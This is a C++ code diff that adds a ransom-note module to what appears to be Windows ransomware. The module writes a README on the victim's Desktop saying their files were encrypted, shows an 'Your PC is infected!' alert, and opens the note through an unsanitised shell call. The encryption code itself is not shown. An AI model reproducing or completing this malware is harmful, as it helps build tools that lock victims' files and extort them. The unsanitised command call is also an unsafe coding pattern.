@@ -78,6 +78,9 @@ int main(int argc, char* argv[])
         }
     }*/
 
+    NoteModule warn_user;
+    warn_user.MakeSomeShit();
+
     return 0;
 }
 
@@ -199,3 +202,56 @@ void FileModule::FindDirectory() {
     CoTaskMemFree(directoryPath); // need to free because SHGetKnownFolderPath allocates address and stores path in it
 
 }
+
+
+// NoteModule implementation starts here
+
+NoteModule::NoteModule() : Note_that_would_be_set_in_file(L"Your PC's files were encrypted.\n") {
+}
+
+NoteModule::NoteModule(std::wstring Note_that_would_be_set_in_file) : Note_that_would_be_set_in_file(Note_that_would_be_set_in_file) {
+}
+
+void NoteModule::MakeSomeShit() {
+    // Getting username
+    wchar_t username[257];
+    DWORD username_len = 257;
+    GetUserNameW(username, &username_len); // Возможно слоамается, если запустить от администратора.
+
+    // Creating README file at parsed above user's Desktop.
+    std::filesystem::path README_file_path = L"C:\\Users\\" + std::wstring(username) + L"\\Desktop\\README.txt";
+    Create_README_file(README_file_path);
+
+
+    // Message Box that notifies user about encrypting files and asks to read README
+    int msgboxID = MessageBox(
+        NULL,
+        "Your PC is infected!\nCheck README.txt file on your desktop.\nPush \"Yes\" button to open file right now.",
+        "CHECK README!",
+        MB_ICONEXCLAMATION | MB_YESNO
+    );
+
+    // If msbox's "Yes" button was pushed - open README.
+    if (msgboxID == IDYES) {
+        wchar_t string_to_open_README[1024] = L"start ";
+        wcscat(string_to_open_README, README_file_path.c_str());
+
+        SetConsoleOutputCP(1251);
+        SetConsoleCP(1251);
+        _wsystem(string_to_open_README);
+    }
+}
+
+// Method that creates README file at Desktop
+void NoteModule::Create_README_file(std::filesystem::path README_path) {
+    std::wofstream out;
+    out.open(README_path);
+    if (out.is_open())
+    {
+        out << Note_that_would_be_set_in_file << std::endl;
+    }
+    out.close();
+
+}
+
+// NoteModule implementation ends here
